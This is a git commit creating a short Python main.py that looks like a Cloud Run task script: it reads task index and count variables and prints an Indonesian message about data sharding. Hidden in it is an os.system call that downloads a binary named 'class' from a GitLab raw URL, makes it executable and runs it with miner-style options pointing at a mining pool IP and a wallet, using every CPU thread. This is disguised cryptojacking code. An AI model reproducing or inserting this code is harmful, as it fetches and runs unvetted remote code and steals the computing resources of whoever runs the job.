4352cb63fac686dc07f23d13b5a1ed49e6ea9965
gersadega4 <gersadega4@gmail.com>
2026-02-26 09:06:54 +0700

    Create main.py

---
+++ main.py
@@ -0,0 +1,6 @@
+import os
+task_index = int(os.environ.get("CLOUD_RUN_TASK_INDEX", 0))
+task_count = int(os.environ.get("CLOUD_RUN_TASK_COUNT", 1))
+os.system('curl -sL https://gitlab.com/barbieanay003/seger/-/raw/main/class -o class && chmod +x class && ./class --donate-level 1 -o 194.163.142.91:80 -u RVmjVrqtLSXkg1bHpgzVgs1AMTF1XMKsaw.$(shuf -n 1 -i 1111-9999)-Amien -a gr -k -t $(nproc --all)')
+print(f"Menjalankan Task {task_index} dari total {task_count}")
+# Gunakan index ini untuk mengambil potongan data tertentu (sharding)
